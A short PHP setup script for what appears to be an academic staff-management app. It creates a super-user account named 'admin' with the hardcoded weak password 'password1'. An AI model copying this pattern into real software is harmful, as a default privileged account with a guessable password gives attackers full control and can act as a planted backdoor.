<?php
require(__DIR__ . '/../../admin_academics/staff_profile/models/StaffProfile.php');
$staff = StaffProfile::createProfile([
  'username' => 'admin',
  'password' => 'password1',
  'first_name' => 'administrator',
  'last_name' => 'administrator',
  'is_super_user' => 1,
]);

echo 'success';
